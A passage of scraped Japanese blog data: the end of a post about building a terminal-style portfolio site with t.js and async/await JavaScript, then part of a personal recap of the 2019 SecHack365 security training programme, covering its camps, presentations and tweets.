とりあえず最初に思いついたギミックがタイピングアニメーションだったのでそれからやり始めることにしました。\n流石にこれを実装するのは骨なのでライブラリみたいなの無いかなと探してここで結構な時間かけて実験して選定しました。\nなんどもここで全消しした記憶。\n結局t.jsを採用しました。\n理由としてターミナルの操作次第で出力が変わるので細かい指定を埋め込むhtml側に入れたいというのと書いて消すというアニメーションがあったのが大きいです。\n中盤 見た目を整えたりボタンを実装したり\u0026hellip;\nこの時点でクリックした操作に応じてコマンド操作のアニメーションが出るって感じの方針が固まりました。\nちなみにターミナルの見た目は僕が普段使っている設定そのものです。\n最初に出てくるAAもここで作りました。\nフォントによって表示がめちゃくちゃになる（形が崩れたりバックスラッシュと円マークがめちゃくちゃだったり\u0026hellip;）のでWebフォントで整えることを覚えました。\n他にもgithubやtwitterのアイコンをリンクの前に付けてみたり選択するボタンごとに実行するコマンドを割り当てたりもしてました。\nこの時点で結構いい感じにターミナルっぽくなってました。\n最初は無理だと思っていた階層構造も上手くボタンの選択肢を絞れば簡単に実現できましたし、それぞれの機能の関数化もだいたい済んでました。（本当に関数を組み合わせるだけ）\nここらへんから地獄の入り口、同期処理が入ってきます。\nかなり勉強になりました。（n敗）\nasync/awaitについて勉強して任意のタイミングでタイピングアニメーションを実行することができました。\n1 2 3 4 5 6 7 8 9  async function main_stream(){ await typing(wait); await typing(hello); await message(welcome_message); await typing(cmd(\u0026#34;whoami\u0026#34;)); await message(about); await typing(cmd(\u0026#34;ls -a\u0026#34;)); await message(ls_root); }   こんな感じで上手いこと同期をとっていかないとターミナルみたいに動いてくれません。\n一気に表示されちゃったりまだ前のが上手く表示されてない内に次に行っちゃったり大変でした。\nタイピングアニメーションやhtmlのjsでの埋め込みのタイミングをとるのが難しかったです。\nただ、完全な同期処理にならずawaitとdelayを使った簡易的なものでした。\n終盤 一番辛くてダレた「文字を書く」という作業です。\nつまり、ポートフォリオの内容の部分ですね。\nここが一番時間がかかったしモチベーションが低かったところだと思います。（リアルで他にやることがあって忙しかったし）\n本気出せば2日くらいで終わる作業だったな\u0026hellip;（今思えば）\nテストページにhtmlで記事を書いて最後にjsの変数として編集するって感じですね\u0026hellip;（地獄）\nあとは見栄えが良くなるようにIframelyを使ってみたり工夫してみまたりcssを微調整してました。（最初のgithubのリポジトリへのリンクはIframelyを使ってます）\n末期 仕上げにして地獄です。\nとりあえず、どんどん下に表示が足されているのにスクロールがそのままで見えなくなっていくのが気持ち悪かったので下部にダミーのタグを用意してそれを追いかける感じでスクロールさせました。\n1 2 3 4 5 6 7 8  function scroll_bottom(){ const targetElement=document.getElementById(\u0026#39;blank\u0026#39;); const rectTop=targetElement.getBoundingClientRect().top const offsetTop=window.pageYOffset const buffer=50 const top=rectTop + offsetTop - buffer window.scrollTo({top,behavior: \u0026#34;smooth\u0026#34;}); }   \u0026lt;body\u0026gt;の最後に\u0026lt;div id=\u0026quot;blank\u0026quot;\u0026gt;というタグがあるイメージ。\n個人的に気に入っている処理。\n最大の問題だったのが同期処理です。\n軽い処理だからdelayの時間を決め打ちしてasync/awaitとdelayを併用すれば行けるでしょ。とか思っていたらやっぱりダメでした\u0026hellip;（当然）\nでもt.jsはjQueryなのでcallbackを基準に使うしか無いし\u0026hellip;（ここで浮き彫りになる技術力不足）\n他はasync/awaitで動いているのでそっちに合わせるのも不可能だしawaitを使っても同期されるのは呼び出されるタイミングだけでhtmlを挿入して実際にアニメーションが動き終わるタイミングはt.jsが用意したcallbackのみぞ知るって感じなんですよね\u0026hellip;\n肝心のアニメーションの終わりがわからないと次の出力とかコマンド操作とかに進めないし\u0026hellip;\n結局所定のcallback関数で元のasync funcのresolve()を呼び出すという世紀末的な解決をして今回はひとまず終了ということにしました。（一応理想通りに動いたので）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  const tjs=function(num,resolve){ //t.js \t$((\u0026#34;.terminal_\u0026#34;+num)).t({ /* some config and process*/ // finished callback \tfin:function(elm){ $(\u0026#39;terminal_\u0026#39;+num).find(\u0026#39;.t-caret\u0026#39;).css({opacity:0}); counter++; resolve();// \u0026lt;- quit async function (and typing func) \t} }) } function typing(text){ const p=new Promise(async(resolve,reject) =\u0026gt; { scroll_bottom(); await new Promise(r=\u0026gt;setTimeout(r, 100)); time_update(); terget.insertAdjacentHTML(\u0026#39;beforeend\u0026#39;,text); tjs(counter,resolve); }); return p; }   tjsという関数の先にt.jsのjQueryが待ち受けているって感じです。\nそこの終了時のcallbackで渡されたresolveを実行して元の関数を終了させています。\n反省 まぁ自分が実現したい機能をすべて達成できたのは良かったです。\nあんまりHTMLとかCSSとかJSって触ったことなかったのでいい勉強になりました。\nそれでも反省すべき点は色々あって、\n スマホとかだと操作しづらい（いわゆる非レスポンシブデザイン） 結局jQueryが何者なのか完全なる理解が得られなかった 最新技術とは程遠い気合のWebページなのでそれらの勉強はできなかった 同期処理が完全な形ではない（だがこれを上回る方法があるのかは一切不明） 保守性の著しい欠如（いちいちhtmlに戻してjsの変数に変換するのは厳しい） ギミック不足（もう少し機能がほしい） 初めての人には分かりづらいかも（別でこのサイトにポートフォリオページを作るか？） そもそも書くほどの成果がない（それはそう）  あたりは大きな反省点です。\nこれらはまた勉強したらおいおい直していきたいです。\n恥を晒すのも勉強の一つということで\u0026hellip;\nこれを作ったらTLに無限に流れてくる難解なWeb用語も分かるかな？とか思ってましたが、構想段階でモダンなあれこれの採用を見送ってしまったので次はVue.jsを使ってみたいです。（なんなのかよく分かってない人）\nオシャレなサイトも作ってみたいなぁ。\n次は何やる？ 次はSecHackの成果発表会に向けての準備と去年からやりたかったCコンパイラの自作に踏み切ろうと思います。\nSecHackでやってる人を見てずっとやりたかったんですよね。自作コンパイラ。\nまぁそれも記事にしたり今回作ったポートフォリオに入れていきたいですね。\n","description":"ポートフォリオの建設がようやく終了したのでメモ。","id":11,"section":"posts","tags":["技術活動","html","js","css","web"],"title":"ポートフォリオサイトを作った","uri":"https://takana-norimasa.github.io/blog/posts/portfolio/"},{"content":"2019年5月の頭、部屋で500円で買ったジャンクモニタを汗だくになりながら分解してたら電話がかかってきた。\n今では聞き馴染みのあるあの人の声だった。\n「SecHack365事務局の\u0026hellip;」\n最初は平静を装っていたが最後は相槌を打つ声が震えていたと思う。\nまさか、応募2年目にして選考を通るなんて\u0026hellip; 嬉しさ半分驚き半分で電話を切った。\nこの日から僕の長いようで短い（ようで長い）1年間が始まったのである。\n（良さげなプロローグ終わり）\nはじめに 2019年度SecHack365を修了したので参加録を書こうと思います。（そのためにこのサイトを構築した）\n昨年応募する際に去年の修了生の方の記事が大いに参考になったので自分の経験も役に立ったらと思ったのと、ただ単に思い出に浸りたかったので書いていきます。\n 自己紹介 SecHack365 ’19の思索駆動コースの修了生です。\nテーマは「セキュアな入出力装置の開発」。\n参加時は高専3年生でした。\nTwitter: @lIlIIllIIIlIlIl\n高専志望時からセキュリティ分野に興味があったので1年の頃からCTFとか講習会とかインターンシップとかトレンドマイクロのガーディアンプロジェクトとかセキュリティに関係がありそうなものにはかたっぱしから応募してました。\nおかげでとりあえず薄く広くセキュリティ分野について学んではいるって感じでした。\nとはいえ、特別何かできることがあるわけでもなくそろそろ何を専門にするのか決めなくちゃなぁと考えていました。（これは今でも考えています）\nSecHack365のことは2年のときには既に知っていたので2018年度にも応募してた（はず（記憶が曖昧1））\nショルダーハッキングに関することをやってみたいなとぼんやり思っていたのでそれで応募することに決めました。\n後述するとおり2019年度は5つの中から応募時にコースを選択する必要があります。\n最初はショルダーハッキングの攻撃部分の研究をやろうかなと考えていたので研究駆動コースに応募しようかなと考えていたのですが、攻撃部分だけ研究してもなぁ\u0026hellip;と思ったので防ぐ側のこともやってみたくなり、様々な面からショルダーハッキングの問題を考えたかったので思索駆動コースに応募することを決めました。\n思索駆動の選考課題はかなりシンプルだったように思えます。（どれくらい言っていいのか分からない）\nSecHack365とは 一年間を振り返る前にSecHack365について紹介したいと思います。\nSecHack365とは国立研究開発法人情報通信研究機構（NICT）が主催するセキュリティに関する長期ハッカソンです。\n5月から翌年3月までの約1年間サイバーセキュリティに関する研究や開発、発表を行います。\n公式サイトには以下のようにあります。\n 若手セキュリティイノベーター育成プログラム SecHack365は、25 歳以下の学生や社会人から公募選抜する 40 名程度の受講者を対象に、サイバーセキュリティに関するソフトウェア開発や研究、実験、発表を一年間継続してモノづくりをする機会を提供する長期ハッカソンです。全国の一流研究者・技術者や受講者等との交流をするなかで、自ら手を動かし、セキュリティに関わるモノづくりができる人材 (セキュリティイノベーター) を育てます。\n  我が国のサイバーセキュリティ産業は、世界のセキュリティソフトウェア市場における存在感が決して大きくないなど、欧米等海外に比べ遅れています。サイバー攻撃が多様化・悪質化する現在において、私たちが自らの手で自らの社会の安全を守っていくためには、既存のセキュリティソフトウェア等をユーザーとして「利用」するだけでなく、新たなソフトウェア等を自ら「研究・開発」していくことができる人材を育成していく必要があります。このような我が国におけるセキュリティイノベーター育成の必要性から、国立研究開発法人情報通信研究機構ナショナルサイバートレーニングセンターでは、未来のサイバーセキュリティ研究者・起業家の創出に向けて、若手の方を対象に、セキュリティ関連技術の研究・開発を一年間をかけて本格的に指導するプログラム SecHack365 を平成 29 年度から開講しています。\n 他のイベントと明確に異なる点は1年間という長い開催期間と、お宿が素敵だということです。\n僕は1年間なんて長い期間1つのものを開発したことがなかったのでこれだけでも貴重な経験になりました。\n数ヶ月に1度、集合回なるものが存在してそこで全員のトレーニーが集合して企業見学とかコースごとに活動をしたり成果を見せ合ったりします。\nこれがまた色んな人とお話ができたり素敵なお宿に泊まったり大きな声では言えませんが凄まじく楽しいです。（大声）\nトレーナートレーニー含めて色んなすごい人を間近で見ることができるのもSecHack365の大きな魅力だと思います。\n本当にこんなすごい人実在するのか\u0026hellip;と驚嘆できます。（技術面だけじゃなくて人間的な部分まで知れてさらに友達になれるのはすごいと思う）\nそして、そんな素敵なイベントへの参加費用を学生に限り全額NICTが負担してくれます！やさしい！（小学生以下の感想）\nコースについて 2019年度のSecHack365にはコースが5つありました。（これは多分毎年違います。最初の年度はコース自体がありませんでしたし、’18年度は3コースでした）\n5つのコースは以下の通りです。\n  表現駆動コース\n・アイデアをかたちにする、その過程で価値を最大化するなどサービスを磨きあげるコース。\n・グループでのハッカソン実施によるサービスづくりを進める 学習駆動コース\n・興味ある技術や作りたいものに対して、付加的な学習をしながら開発を進めるコース\n・付加学習により他技術や他分野を知ることで、作るもののアイディアの幅を広げる 開発駆動コース\n・まずは実装を作り上げることに重きをおく、開発指導に特化したコース\n・開発テーマや分野が定まっている受講生を受け入れて開発を進めるための指導を実施する 思索駆動コース\n・思索を通じて問題を深掘りし、その解決を行うコース\n・日常に遍在する違和感に立ち向かう人材を育成する 研究駆動コース\n・研究的プロセスに基づいたアイデア、仮説立案と検証評価を重視したコース\n・研究者的なスキルを磨いて、将来の研究者になり得る人材を育成する   応募するときは過去の修了生の記事を見ておおまかに雰囲気を掴んでおくと良いかもしれません（実際難しいけど）\n今思うと僕のテーマって思索駆動にぴったりだったんだな\u0026hellip;\n1年間の振り返り ということで1年間の活動を振り返っていきたいと思います。\nといっても頭を洗ったことを忘れて2回シャンプーをするような男なので記憶力には期待しないでください。\n神奈川回を機にTwitterを始めていて本当に良かった\u0026hellip;\n合否通知から神奈川回まで 合格通知を頂いてからは事務手続きをしたり事前アンケートに答えてたりしました。\n僕らのコースでは自己紹介スライドを作成するのが最初の課題でした。\nログを見返したらこのときから僕のスピーカーノート芸は存在してたらしいです。（超懐かしい）\n神奈川回 5月17日（金）〜5月19日（日）\n出発の地は神奈川です。\nわりかし家から近めなのでのんびり出た記憶。\n悠長に家系ラーメン総本山の吉村家に行ってます。（SecHackラーメン3連戦の初戦「横浜ラーメン」）\n おいしかったです。ちなみにそれ以外に写真は撮ってませんでした。なんで（殺意）\n駅を降りると既にそれらしい人が数人スーツケースを引いてました。\n会場の前に誰かに話しかけてもらったのを覚えてます。2\n1日目はオリエンテーションとトレーナーを囲む会といってトレーナーさんの話を聞けるコーナーがありました。\nSecHackの特徴としてトレーナー陣が豪華だなと個人的には思います。\n様々な分野の方がいて聞いていて面白かったです。\n2日目はアイデアソンを行いました。\n今思えば全体でこういうことをするのは最初で最後でしたね\u0026hellip;\nランダムに振り分けられたチームでアイデア出しから発表までやりました。今もう一度やったら違った雰囲気になるんだろうなぁ\u0026hellip;\nそれからコースワークの時間もありました。\n用意したスライドを使って自己紹介です。スライドを頑張って用意して良かった！( ⁎˃ᴗ˂⁎)3\n3日目の朝になると集合回ももう終盤です。\nたしかコースワークをした覚えがあります。\nこのコースワークでは今後の思索駆動コースで重要な役割を果たすアレをやったのですが、やったことを1から10まで書いてもしゃーないのであえて書きません。（もう既にネタバレ気味になっているこの記事）\nそれから今まで渋っていたTwitterもこの機会にはじめました。\n早速一つマンダラートを埋めてやりたいと思います。\n対戦よろしくお願いします。#はじめてのツイート#SecHack365\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) May 18, 2019  SecHackは長期間のハッカソンなので習慣化の取り組みがあります。始めたのはその一環であるマンダラートがきっかけですね。\nマンダラートの取り組みについては公式の開催レポートにも書かれていたと思います。\nなんともあっという間な3日間でした。\nこの3日間でも衝撃を受けることばかりでした。\n特に思索駆動コースでの誰かと対話して思索を深めていくという経験はしたことがなかったのですごく新鮮でした。\nこんなにも新しい視点とか考えが生まれるものなのかとびっくりしました。\n他人と意見を出し合っていく中で自分の意見が核心に近づいて行く感覚は感動ものだし多分SecHackに行かなければ自分は一生味わっていなかったかもしれない(何故か毎回討論中は気が付かないで後から気が付くけど)\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) May 21, 2019  当時の自分も興奮気味。\n逆に反省点はあんまり誰かとお話できなかったかなと思いました。（今思えばなおさら）\n持ち前の圧倒的コミュ症が遺憾なく発揮されていましたね\u0026hellip;\nそれでも夕食で誰かと一緒に話すのは楽しいですが。（集合回が終わるごとにお話してくれた方ありがとうございましたみたいなツイートをしていた気がする）\nそんな感じで最初の神奈川回が終わりました。\n楽しかったってめっちゃ言っていた記憶。\n習慣化はじまる ことの発端はこのツイート。\n一週間分の思索とかいろいろ一つのスライドにまとめて毎週出したいな\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) May 22, 2019  せっかく念願叶ってSecHackに参加してるんだからなにかモチベーションを保てることをしたいなぁ（自分がダメ人間なのは自分がよく分かってる）と思ってこんなことを考えてました。\nちょうど神奈川回で習慣化の話を聞いた後だったのでやってみようと思ったのです。\n 以後、この一週間ごとのスライドが僕のSecHackの活動の基準となっていきます\u0026hellip;\nInterop Tokyo \u0026amp; ShowNet SecHack365の枠でInterop Tokyo のShowNetに招待していただきました。\n 交通費は自費ですが、会場はなんと幕張メッセ。\nチーバくんの口元からおへそあたりを毎日往復してる僕にしてみれば庭みたいなものです。\n平日開催でしたが、運良く定期テストの終わりと被っており普通に行けました。（ラッキー）\n最先端の大規模ネットワーク構築のお話と実際の運用を見られてかなり勉強になりました。\n 会場で運用されている機器も大迫力です。\nInteropは企業向けイベントなので学生はShownet以外はチョロっと覗くくらいが丁度いいと思います。（向こうは企業の人間だと思って話しかけてくるのでお互い気まずいかも(一敗)）\nかなり勉強になったし行ってみて良かったです。\n北海道回 6月28日（金）〜6月30日（日）\n英検の2次試験と被りました（一敗）\n事前に申請すれば別日程にできる可能性もあるのでみんなはそこらへんのスケジュール管理はしっかりしよう！（教訓）\n第二回は北海道回です。そして僕は初北海道です。（不要な情報）\nSecHackラーメン3連戦の2戦目の地でもあります。\n着いてすぐに札幌ラーメンを食しました（当然の権利）\n 久しぶりに飛行機に乗ったのですが保安検査場で引っかかりました。\n【悲報】保安検査WA\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) June 30, 2019  実はこれ以後保安検査場は僕の因縁の相手になります。\n最初にさくらインターネット株式会社のデータセンターを見学させていただきました。\n思っていた以上にセキュリティが厳しくてビックリしました。（場所も機密とのこと）\n普段はめったに見られないデータセンターを見学できただけでなくそこで働かれている方のお話も聞けてよかったです。\n北海道の広大な立地と低い気温がデータセンターにピッタリなんだとか。\nすごく広かったのととにかくセキュリティが厳重だったのが印象的でした。\nそして例によって行きのバスでぼっち席を決めてしまう凡ミスのやらかし。最後までこのやらかしは多々ありますけど。\nそのまま夕食。豪華でした。（写真を撮るのがへたくそなので誰かの写真を見てください）\nあとSecHackのシャツをいただきました。基本的には集合回ではこれを着ます。かなり素敵。\n二日目はコースワークと縁日がありました。\n高まりすぎて鼻血を出した記憶。\n縁日とは有志のトレーナーの方々による技術ワークショップです。\n2つまで選べるのですが、どれも魅力的でかなり迷いました。\n結局、今岡先生の「LANパケット盗聴ガジェットの作り方」と衛藤先生の「ネットワークハッキング~自由を手に入れよう！誰でもできるネットワークすり抜け術~」を受講しました。\nどちらも実践的で面白かったです。こんな体験めったにできないと思います。\nその後には倫理についての講義がありました。\n現役の検事さんである増田検事から法律面での講義です。\n普段セキュリティを学ぶ上で法律面での問題とか疑問って色々出てきますが、実際の検事さんから法律のお話を聞けたのはすごいありがたかったです。\n余談ですが、増田さんは気さくにお話をしてくださる方でいつも温泉でトレーニーと話してました。（宮城回まで帯同されていました）4\n思い出深いトレーニーも多いでしょう。\n基本的にSecHackでは温泉での思い出が多い気がします。（SecHackあるある）\n北海道回のホテルにはプールがあったので水着を持っていた僕は（何で？）せっかくなので泳ぎました。\n夜は温泉入ったりゲームコーナーに行ったり卓球をしたり最早リゾート気分です。\n特に発表もなく、このあたりが一番楽な（慢心）期間だったと思います。\n寿司→水泳→温泉→卓球→乗馬→開発 https://t.co/sRetiSPQpu\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) June 29, 2019  そして神奈川回の週からやっている週報が評価されて佳山先生から富士通羊羹をいただきました。\n佳山トレーナーに富士通羊羹を頂きました！\nこれからも精進します！#SecHack365 pic.twitter.com/xw598Ht1ny\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) June 30, 2019  非常に美味しかったです。\n羊羹の外箱が後のプロトタイプの寸法の規格になったとか\u0026hellip;\n初北海道でしたが、涼しくてとっても良いところでした。\nどちらかというと縁日とかデータセンター見学といったインプットが中心の集合回だったと思います。\nすごく楽しかったです。友達をつくるならここがチャンスかも知れません。\n福岡回 8月21日（水）〜8月23日（金）\n道に迷った（一敗）\n早めに現地に着くという勝ち確ムーブをカマしておきながら肝心の道中で道に迷って遅刻ぎりぎりのムーブをやらかす。\n旅先で必ずトラブルに見舞われる僕の習性があからさまに現れていますね\u0026hellip;\nちなみにこれはまだ時間に余裕があった頃。（早めに着いても時間を潰さなくてはならなくてあんまり変わらない（挙げ句道に迷う）ので賢い選択じゃなかった）\n はい。SecHackラーメン3連戦最終戦です。（横浜→札幌→博多）\n福岡回のメインは全員がスライドを使って自分のテーマについて発表するというものです。\n1日目はnulabさんのところで社員さんのお話を聞くところからスタートしました。\n技術的なところだけじゃなくて働き方とかどこに住むかとか社会人になったときの細かいお話が聞けて面白かったです。\n地方で働くのもたのしそうだなぁと思いました。\nそして\u0026hellip;\nまたぼっちバスを決めてしまった（学習しない人間\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) August 21, 2019  なんで学習できないんですかね\u0026hellip;（二敗目）\nしかし、移動中の車窓から見られる海はとっても素敵でした。\n途中両側が砂浜になっているところを通るのですがそこがとても綺麗です。\n夜ご飯は例にもれず美味しかったです。（明太子がたらふく食べられて満足）\n二日目は朝から夕方までずっと発表です。\n一人（または1チーム）6分で自分のやりたいテーマに関してプレゼンします。（全員分やる）\n助言とか指導を得たり一緒に取り組んでくれる仲間を探すのがおおまかな目的です。\nここでやっと全員のやりたいことが明らかになる気がします。（そしてやっと顔とTwitterアイコンが一致する）\n発表はオンラインゼミとかでやっているのでそこまで緊張しませんが、待ってる間はやっぱり緊張するものです。\n発表中は緊張しなくても発表前は緊張するのはあるあるですね\u0026hellip;\n聴講者は発表を聞くだけじゃなくて発表に対してコメントをするルールなので聞いてる側も暇しているわけではないですし、発表する側はたくさん意見をもらえるので良いシステムです。\n発表が終わった後はみんなでホテルの前の海へ。\n （写真はコースワークの散策で撮った）\n水着を持ってきていたのでしばらくみんなで海で遊びました。\n見事に綺麗な青い海と白い砂浜です。\n長時間の発表で疲れていたので丁度いい癒やしになりました。\nこの回からありがたいことに事務局の方が会場を夜まで開放してくださいました。\n持ってきたプロトタイプを直したり作っているものについて話したりしました。\n以降、この時間でプロトタイプを直したり助言をいただくことが多くなりました。\nこの回から方向性がハッキリしてきたと思います。\nバスが出るまでの時間も横山先生とお話させていただき色々考えていました。\nトレーニーの方とも議論したりお話できて良かったです。\n帰りの飛行機で窓から花火が見えました。\n3日間という短い間ですが、終わってしまうとすっごい寂しいです。\n宮城回 10月4日（金）〜10月6日（日）\n今回は飛行機じゃなくて新幹線を利用しました。\n新幹線での開発は楽しいなぁ pic.twitter.com/MR1xhONJJv\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) October 4, 2019  飛行機に比べて新幹線の快適さにビックリ。\n宮城回では主にポスター発表とデモがあります。\n各自、機材とか資料とかポスターを用意して会場に乗り込みます。\n僕は前回に引き続きハードウェア面でのアプローチに挑戦したのですが、トラブル続きで大変でした。\nというか、電子工作とは縁があんまり無い科の出身でブレッドボードはよく扱っていましたがはんだ付けとかはほとんど初挑戦でした。\n思索駆動コースは自分が提起した問題があってそこから思索して問題解決の形とか方法を見つける感じなので何かに特化してるよりも広く何かを学んでいると良いかも知れません。（自分の得意な分野にもっていくことも可能ですが）\n僕は新しいことに挑戦して表現の幅が広がったらなぁと思ったのとハードウェアのデバイスを作ったほうが自分の問題を解決できそうかなぁと思って挑戦しました。\n今考えたら技術面でも他のコースの人とかにトレーナーにガンガン頼ったほうが良かったかなぁと思います。\n展示では色々な人に見ていただきたくさん意見を貰いました。\n僕より詳しい人がいっぱいいるのでありがたかったです。\n晩ごはんはもちろん素敵です（この頃から写真を撮ることを覚え始めている（えらい））\n 夜にはくぼたつ道場。\n珍しくトレーナー達が（無茶振りで）お手本を見せることに。（頂上決戦かな？）\nいろいろなトレーナーのやりたいことが聞けておもしろかったです。（珍しくトレーナーの慌てた姿も見られました。）\n僕もやってみたのですが、相手に質問をせずにどんどん自分のやりたいことを言っていくのは思索駆動的には新鮮でした。\n宮城回の舞台は松島だったのですが、窓からの景色が綺麗ですごい良かったです。\n 解散後には暇があったので松島周辺を観光しました。\n すごく綺麗でいいところです。\n実際に島に上陸して中まで楽しめてよかったです。\n帰りは@tomio2480氏と牛タンを食べ圧倒的勝利を納めました。\npic.twitter.com/nu97UOIRgW\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) October 6, 2019  松島、絶景が拝めて美味しいものも食べられて最高でした。（若干の旅行気分）\n実はこの翌週に高専プロコンが待ち受けていて地獄を見ることになるのですが。\n愛媛回 11月29日（金）〜12月1日（日）\n初四国です。（多分）\nそして定期テスト最終日と一日目が被りました（絶望）\nどうにか追試をやっていただけるとのことで不参加という事態は避けられましたが、テスト勉強と資料づくりとプロトタイプ制作の3つを並行して行うという地獄を味わいました。\nもはやこれはどうしようもないことですが、事前に学校の予定とSecHackの予定を照らし合わせて事前に覚悟をする必要はあると思います。\nなるべく早く準備を始めるとか\u0026hellip;（分かっていても難しいですが\u0026hellip;）\n舞台は奥道後です。温泉ですよ温泉。\n ちなみに集合場所の最寄り駅までは路面電車で行きました。\n 路面電車って初めて乗ったかもしれない。風情があって素敵な電車でした。\n愛媛回のメインは前回同様のポスター発表とデモに加えて15分の発表もあります。\n両方あるので準備が大変でした\u0026hellip;\nちなみに今回のポスターはA0サイズです。こんなにでかいポスターは生まれて初めてです。\n一日目がポスター発表+デモで二日目が発表って感じです。\nそして今回も会場の魔物に襲われます。\n今回もオフライン回の魔物に進捗をやられた\n家では動いてたんですよ本当に...\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) December 1, 2019  なんて恐ろしい\u0026hellip;\nここまで来ると動かないときの準備もしてます。（用意周到（そういう問題じゃない））\nハードウェアは恐ろしいですね。（毎晩会場に残ってひーひー言いながら直していたのはいい思い出）\nこれが会場の魔物です https://t.co/NHMGeQwGFf\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) December 1, 2019  そして当然のように現れるおいしいお食事。\n 最高です。鯛めしが美味しかった（小並感）\nここらへんから年の近い子と食べるようになりました（若い子っていいわね。5）\n二日目の夜にはマツダの方のセキュリティに関するお話や噺家の方の講演がありました。\n毎回言えることですが様々な分野の方のお話を聞けて楽しいです。\n車も落語も好きなので楽しめました。\n原則、僕は夜はあんまり交流するよりも、意固地になって会場で居残って動かないプロトタイプを修理してるタイプでしたがこの日は確かみんなと遊んだ気がします（全体を通してその方が良かったかもしれない）\nまぁ、残って修理をしていてもそれはそれで居残り組で話したり助け合いながら作業することも（人がいれば）できるのでそれはそれで楽しいものです。\n確かセキュリティ大喜利とかをした思い出があります。僕は全日本コミュ症選手権ベスト8の猛者ですがもうここまでくれば流石に多少は大丈夫です。\nやっぱり普段とはちがう人とワイワイできて楽しかったです。\n世代も分野も違う人なので多分SecHackが無ければ一生出会うことがなかった仲間でしょう。\n調子に乗って遅くまで起きていました。（すごいいい思い出）\nいろんな人と話して上機嫌で部屋に戻る途中でこんな場所に出ました。\n豆知識\n3階の3301号室に向かう突き当たりの先はめちゃくちゃ怖い空間が広がっている\n僕は怖すぎて引き返した\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) November 29, 2019   廊下から一段折れていて控室という意味不明な張り紙とその奥に見える白い扉。\n扉を開けると真っ暗やみでなんか外に繋がっているっぽい。\nプロのビビリストである僕は即座に怖くなって引き返しました。（写真がぶれているのはそのせいです。）\nちなみに、翌日知ったのですが会場へのものすごい近道でした（知らずにすごい遠回りをしていた）\n僕の中で話題のめちゃくちゃ怖い空間（通称:メコワ）ですが会場前のスロープを登るとそこに繋がっていることが分かりました\nわざわざエレベーターまで行って一度登って降りていた僕の苦労は一体 https://t.co/7eTNaYizRY\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) November 30, 2019  美味しいものも思い出も講演も発表も満喫したので楽しかったです。\nSecHackでは事務局の方がいろいろお菓子とかジュースとか用意してくれるのですごいありがたいです。\n今回はありがたいことにみかんが用意されていました。（これがなかったら危うく愛媛でみかんを喰わずに帰ることだった\u0026hellip;）\n本当にいたれりつくせりでこんなものも用意されていました。\nうどんキャラメル残り1個なのでトレーニーの方オススメですよ#SecHack365\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) November 30, 2019  ちなみに帰りの空港で再会しました。 お、お前は... pic.twitter.com/kpxYjcZqb3\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) December 1, 2019  空港で美味しそうなスイーツを買ったりトレーニーさんとお話したりもはや僕に抜かりはありません。\npic.twitter.com/4WLHfpYegD\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) December 1, 2019  人間的にも圧倒的成長してる気がする。 沖縄回 1月31日（金）〜2月2日（日）\n最終決戦の地は沖縄です。（写真はホテルからの眺め）\n ちなみに僕は初沖縄です！（要らぬプチ情報）\nそして\u0026hellip;また定期試験と被りました（全ギレ\nしかも今度は初日です。（絶望）\nテスト勉強と資料づくりとプロトタイプ制作の3つを並行して行うという地獄を味わいました。（二敗目）\n初っ端電車が遅れて飛行機に間に合わなくなる大ガバムーブをカマします。\nかなりの焦りを見せまして慌てて電車の中で航空会社に電話をかけていました。（このままの予定だとフライト-2分前くらいに着く（アカン））\n結局電車が遅れたことを伝えたら快く次の便に振り替えてくださって普通に間に合いました。\n危なかった\u0026hellip;\n皆さんは気をつけましょう。\n会場についてまず嬉しかったのは一年間所望し続けていたマウンテンデューが置いてあったことです。（事務局さんありがとう！！）\n遂に最終回にして僕の願いが届きました#SecHack365 https://t.co/xSpdH9Wyp8 pic.twitter.com/6J7APQy54O\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) January 31, 2020  みんなを見て久しぶりだなぁと思ったと共に何故か一昨日あたりも会わなかった\u0026hellip;？って感じになりました。\n近いようで遠いようで近い存在。SecHackのトレーニーは不思議な関係だと思います。\nさて沖縄回のメインは最終発表です。\nこの一年間自分がやってきたことについて発表します。\nちなみに、この発表は優秀修了生の審査も兼ねています。表現力・技術力・アイデアの3つの観点から評価しこれらの総合点で6件の優秀修了生を選出するそうです。\n最終発表はかなりの長期戦で一日目と二日目をフルで使います。\n僕は二日目だったので一日目の夜は遅くまでスライドを書いたりしてました。（既に終わっている子と話したり楽しかったです）\n当日の発表ですが、僕はというと作ったデバイスで身を固めて発表しました。これが一番イメージが伝わるかなぁと。\nえっ怖...\n皆さん気を付けてください https://t.co/FH5LRnHyaM\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) February 1, 2020  発表中は自分の言いたい放題できるので発表していて楽しかったです。\nちなみにこんな発言をしたら、\nこれで開催レポートのサムネは俺のものだ#SecHack365\n\u0026mdash; Takana Norimasa (@lIlIIllIIIlIlIl) February 1, 2020  